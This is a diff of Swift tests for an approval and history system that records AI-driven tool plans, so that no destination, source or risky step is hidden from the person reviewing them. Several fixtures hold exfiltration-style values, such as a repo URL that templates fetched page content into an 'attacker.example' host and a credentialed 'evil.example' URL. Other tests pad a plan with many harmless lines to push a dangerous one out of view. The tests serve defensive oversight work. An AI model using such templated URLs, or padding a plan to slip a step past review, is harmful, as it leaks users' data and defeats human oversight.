@@ -348,51 +348,6 @@ import Testing
         #expect(!quiet.asked && quiet.reply["silent"]?.boolValue == true)
     }
 
-    @Test func historyNamesEveryLineEvenWhenItCantListEveryField() async throws {
-        let w = try await World()
-        try await w.setMode(.fullAccess)
-        // 40 different lines: every one is NAMED, and each says how many of its fields are listed, the rest counted at the end.
-        let filler = String(repeating: "and a long sentence about nothing ", count: 3)
-        let steps: [JSONValue] = (0..<40).map { ["tool": "notify.user", "input": ["title": .string("Step \($0) \(filler)")]] }
-        #expect(await !w.approve(FlowApprovalTests.plan(steps)).asked)
-        let row = try await w.rows("extensions.plan").first
-        #expect(row?.decision == .fullAccessPlan)
-        let lines = row?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.count == 64 && lines.last == "+18 more", "what did not fit is counted: \(lines.suffix(2))")
-        let headers = lines.filter { $0.hasPrefix("notify.user · fields") }
-        #expect(headers.count == 40, "every line is named")
-        #expect(headers.filter { $0.hasSuffix("fields: 1") }.count == 22 && headers.filter { $0.contains("0 of 1 listed") }.count == 18, "and says how many of its fields are listed")
-        for i in 0..<22 { #expect(lines.contains { $0.contains("Step \(i) ") }, "field \(i) is listed") }
-        // And on the screen: History shows a list one entry to a line, uncut, so the count at its end is there to read.
-        let shown = ActivityArguments.rows(row?.args).first { $0.name == "lines" }?.value.split(separator: "\n").map(String.init) ?? []
-        #expect(shown.count == 64 && shown.last == "+18 more", "\(shown.suffix(2))")
-    }
-
-    @Test func aHandOverToTheAiAndAFlowItSetsOffAreNamedOnTheRowToo() async throws {
-        let w = try await World()
-        try await w.setMode(.fullAccess)
-        let steps: [JSONValue] = [FlowApprovalTests.page, ["kind": "ai", "as": "write", "title": "Write the digest", "reads": ["page"]], ["kind": "flow", "name": "Send the mail"]]
-        #expect(await !w.approve(FlowApprovalTests.plan(steps)).asked)
-        let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.contains { $0.hasPrefix("Hands to your AI:") && $0.contains("Write the digest") && $0.contains("Read the page") }, "\(lines)")
-        #expect(lines.contains { $0.hasPrefix("Sets off: “Send the mail”") }, "\(lines)")
-    }
-
-    @Test func aLongValueIsSplitOverEntriesNotCutAtItsTailAndTheKindOfSourceComesFirst() async throws {
-        let w = try await World()
-        _ = try w.registerHub()
-        try await w.setMode(.fullAccess)
-        let pad = String(repeating: "a", count: 230)
-        let post = FlowApprovalTests.post(["repo": .string("https://user:\(pad)@evil.example/{{page}}")])
-        #expect(await !w.approve(FlowApprovalTests.plan([FlowApprovalTests.page, post])).asked)
-        let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        let repo = lines.filter { $0.contains("/ repo: ") }
-        #expect(repo.count >= 2 && repo.allSatisfy { $0.count < 270 }, "several short entries: \(repo.map(\.count))")
-        #expect(repo[0].contains("/ repo: outside content: “https://user:"), "the kind of source first: \(repo[0])")
-        #expect(repo.contains { $0.contains("@evil.example/") }, "the host past the long part is there")
-        #expect(repo.last?.contains("[from") == true, "and the slot after it")
-    }
-
     @Test func theNamesOfWhatMakesASlotAreNotClippedAndTheToolIsNamed() async throws {
         let w = try await World()
         _ = try w.registerHub()
@@ -404,28 +359,6 @@ import Testing
         #expect(lines.contains { $0.contains("[from \(title) · web.fetch]") }, "who makes the slot, whatever its title: \(lines)")
     }
 
-    @Test func thirtyHarmlessLinesBeforeADangerousOneDoNotPushItOutOfTheRow() async throws {
-        let w = try await World()
-        _ = try w.registerHub()
-        try await w.setMode(.fullAccess)
-        var steps: [JSONValue] = (0..<30).map { ["tool": "notify.user", "input": ["title": .string("Harmless \($0)")]] }
-        steps.append(FlowApprovalTests.post(["repo": "me/digest"]))
-        #expect(await !w.approve(FlowApprovalTests.plan(steps)).asked)
-        let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.contains { $0.hasPrefix("Create an issue (GitHub)") && $0.contains("fields:") }, "the server line is named: \(lines.prefix(6))")
-        #expect(lines.contains { $0.contains("/ repo: “me/digest”") }, "and where it goes is listed before the free words of the others")
-    }
-
-    @Test func aWrittenWordThatLooksLikeASecretCantMakeAnEntryPastWhatHistoryKeeps() async throws {
-        let w = try await World()
-        _ = try w.registerHub()
-        try await w.setMode(.fullAccess)
-        let body = (0..<40).map { "token: abcdef\($0)" }.joined(separator: " ")
-        #expect(await !w.approve(FlowApprovalTests.plan([FlowApprovalTests.post(["body": .string(body)])])).asked)
-        let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.allSatisfy { $0.count <= 300 && !$0.hasSuffix("…") }, "nothing is clipped bare: \(lines.map(\.count))")
-    }
-
     @Test func thePlansLimitsAndItsWarningAreOneEntryOfTheirOwn() async throws {
         let w = try await World()
         _ = try w.registerHub()
@@ -434,6 +367,84 @@ import Testing
         #expect(await !w.approve(FlowApprovalTests.plan([notes, FlowApprovalTests.page, FlowApprovalTests.post(["body": "{{page}}"])], perDay: 40)).asked)
         let first = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue).first ?? ""
         #expect(first.hasPrefix("limits: 40 a day") && first.contains("warning:"), Comment(rawValue: first))
+    }
+
+    /// A history row's entries, as the screen would show them.
+    private func record(_ w: World) async throws -> [String] {
+        try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
+    }
+
+    @Test func aPlanThatFitsIsRecordedInFullEveryLineAndFieldWithItsNumber() async throws {
+        let w = try await World()
+        _ = try w.registerHub()
+        try await w.setMode(.fullAccess)
+        let second: JSONValue = ["tool": "web.fetch", "as": "path", "input": ["url": "https://news.example.com/b"]]
+        let ai: JSONValue = ["kind": "ai", "as": "write", "title": "Write the digest", "reads": ["page"]]
+        let post = FlowApprovalTests.post(["repo": "https://{{page}}.attacker.example/{{path}}", "body": "{{write}}", "labels": ["a@x.com", "b@y.com", "evil@z.com"]])
+        let steps: [JSONValue] = [FlowApprovalTests.page, second, ai, ["tool": "notify.user", "input": ["title": "Done"]], ["kind": "flow", "name": "Send the mail"], post]
+        #expect(await !w.approve(FlowApprovalTests.plan(steps)).asked, "a plan that fits History is answered with no card")
+        let lines = try await record(w)
+        #expect(lines.first?.hasPrefix("limits:") == true)
+        for number in 1...6 { #expect(lines.contains { $0.hasPrefix("#\(number) ") }, "line \(number) is named: \(lines)") }
+        #expect(lines.contains { $0.hasPrefix("#3 Hands to your AI:") } && lines.contains { $0.hasPrefix("#5 Sets off: “Send the mail”") })
+        let repo = lines.first { $0.contains("/ repo:") } ?? ""
+        #expect(repo.hasPrefix("#6 ") && repo.contains("outside content: “https://” [from") && repo.contains("“.attacker.example/” [from"), "the number, the kind first, every written part: \(repo)")
+        let body = lines.first { $0.contains("/ body:") } ?? "", labels = lines.first { $0.contains("/ labels:") } ?? ""
+        #expect(body.hasPrefix("#6 ") && labels.hasPrefix("#6 ") && labels.contains("list (3)") && labels.contains("evil@z.com"), "a body stays with its destination: \(body) \(labels)")
+        #expect(lines.allSatisfy { $0.count <= 270 } && lines.count <= 60)
+        #expect(ActivityArguments.rows(try await w.rows("extensions.plan").first?.args).first { $0.name == "lines" }?.value.split(separator: "\n").count == lines.count, "one to a line on the screen")
+    }
+
+    @Test func theSameToolTwiceKeepsEachDestinationWithItsOwnBody() async throws {
+        let w = try await World()
+        _ = try w.registerHub()
+        try await w.setMode(.fullAccess)
+        func post(_ name: String, repo: String, body: String) -> JSONValue { FlowApprovalTests.post(["repo": .string(repo), "body": .string(body)]).withName(name) }
+        let notes: JSONValue = ["tool": "notes.search", "as": "mine", "input": ["query": "plans"]]
+        #expect(await !w.approve(FlowApprovalTests.plan([post("a", repo: "evil/attacker", body: "hi"), notes, post("b", repo: "me/digest", body: "{{mine}}")])).asked)
+        let lines = try await record(w)
+        func number(_ field: String, _ text: String) -> String? { lines.first { $0.contains("/ \(field):") && $0.contains(text) }?.prefix(3).description }
+        #expect(number("repo", "evil/attacker") == number("body", "“hi”") && number("repo", "me/digest") == number("body", "[from") && number("repo", "me/digest") != number("repo", "evil/attacker"), "\(lines)")
+    }
+
+    @Test func aPlanThatCantBeRecordedInFullAlwaysShowsItsCardInEveryMode() async throws {
+        let long = String(repeating: "x", count: 300)
+        let manyReads: [JSONValue] = (0..<12).map { ["tool": "web.fetch", "as": .string("p\($0)"), "title": .string("Producer number \($0) with a title"), "input": ["url": .string("https://news.example.com/\($0)")]] }
+        let reads: [JSONValue] = (0..<12).map { .string("p\($0)") }
+        let tooMany: [JSONValue] = (0..<41).map { ["tool": "notify.user", "input": ["title": .string("Step \($0)")]] }
+        let cases: [(String, [JSONValue])] = [
+            ("41 lines", tooMany),
+            ("an AI line with more sources than an entry holds", manyReads + [["kind": "ai", "as": "w", "reads": .array(reads)]]),
+            ("a 300-character value", [["tool": "notify.user", "input": ["title": .string(long)]]]),
+            ("a host that looks like a secret", [["tool": "notify.user", "input": ["title": "https://token:abcdefgh@evil.example/"]]]),
+            ("a word that looks like a secret", [["tool": "notify.user", "input": ["title": "token: abcdefgh1234"]]]),
+        ]
+        for mode in [GuardMode.fullAccess, .auto] {
+            for (label, steps) in cases {
+                let w = try await World()
+                try await w.setMode(mode)
+                if mode == .auto {
+                    // In Auto the edit is the new lines: the plan was read before them.
+                    _ = await w.approve(FlowApprovalTests.plan([FlowApprovalTests.save]))
+                    guard steps.allSatisfy({ $0["kind"] == nil && $0["tool"]?.stringValue == "notify.user" }) else { continue }
+                    #expect(await w.approve(FlowApprovalTests.plan([FlowApprovalTests.save] + steps)).asked, Comment(rawValue: "Auto: \(label)"))
+                } else {
+                    #expect(await w.approve(FlowApprovalTests.plan(steps)).asked, Comment(rawValue: "Full access: \(label)"))
+                }
+            }
+        }
+        // A field named like a secret, on a server line.
+        let w = try await World()
+        _ = try w.registerHub()
+        try await w.setMode(.fullAccess)
+        #expect(await w.approve(FlowApprovalTests.plan([FlowApprovalTests.post(["token": "abcdefgh"])])).asked, "a field named token")
+    }
+
+    @Test func aPlanThatFitsStillPassesInFullAccessAndInAuto() async throws {
+        let w = try await World()
+        try await w.setMode(.auto)
+        _ = await w.approve(FlowApprovalTests.plan([FlowApprovalTests.save]))
+        #expect(await !w.approve(FlowApprovalTests.plan([FlowApprovalTests.save, ["tool": "notify.user", "input": ["title": "Done"]]])).asked)
     }
 
     @Test func historyNamesWhatNobodyReadAndSaysItWasNotAPlanTheyRead() async throws {
@@ -539,35 +550,6 @@ import Testing
         let row = try await w.rows("ext.hub.post").first
         let said = row?.args?["_filled_from"]?.arrayValue?.compactMap(\.stringValue) ?? []
         #expect(said.count == 2 && said.contains { $0.hasPrefix("outside content: body from") } && said.contains { $0.hasPrefix("outside content: title from") }, "\(said)")
-    }
-
-    @Test func theDestinationOfALineSurvivesAHistoryClipWhateverTheBodyIs() async throws {
-        let w = try await World()
-        _ = try w.registerHub()
-        try await w.setMode(.fullAccess)
-        let long = String(repeating: "a long body of words, ", count: 40)
-        let post = FlowApprovalTests.post(["body": .string(long), "title": "Weekly"])
-        #expect(await !w.approve(FlowApprovalTests.plan([post])).asked)
-        let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        #expect(lines.contains { $0.contains("/ repo: “me/digest”") && $0.contains("GitHub") }, "where it goes, and who gets it, whatever the body: \(lines)")
-        #expect(lines.firstIndex { $0.contains("/ repo:") } ?? 99 < lines.firstIndex { $0.contains("/ body:") } ?? 0, "places before free words")
-    }
-
-    @Test func theRowHidesNoLiteralNoListItemNoDestinationAndNoKindOfSource() async throws {
-        let w = try await World()
-        _ = try w.registerHub()
-        try await w.setMode(.fullAccess)
-        let long = String(repeating: "x", count: 300)
-        let second: JSONValue = ["tool": "web.fetch", "as": "path", "input": ["url": "https://news.example.com/b"]]
-        let post = FlowApprovalTests.post(["repo": "https://{{page}}.attacker.example/{{path}}", "body": .string(long), "labels": ["a@x.com", "b@y.com", "evil@z.com"]])
-        #expect(await !w.approve(FlowApprovalTests.plan([FlowApprovalTests.page, second, post])).asked)
-        let lines = try await w.rows("extensions.plan").first?.args?["lines"]?.arrayValue?.compactMap(\.stringValue) ?? []
-        let repo = lines.first { $0.contains("/ repo:") } ?? ""
-        #expect(repo.contains("outside content: “https://” [from") && repo.contains("“.attacker.example/” [from"), "every written part between slots, the kind first: \(repo)")
-        let labels = lines.first { $0.contains("/ labels:") } ?? ""
-        #expect(labels.contains("list (3)") && labels.contains("evil@z.com"), "every item and how many: \(labels)")
-        #expect(lines.filter { $0.contains("/ body:") }.count >= 2, "a long field is split, not cut")
-        #expect(!lines.contains { $0.contains("program: not checked") }, "this server's program was checked")
     }
 
     @Test func aWholeSlotOnAStringFieldTakesNoRecordBecauseTheSchemaRefusesIt() async throws {
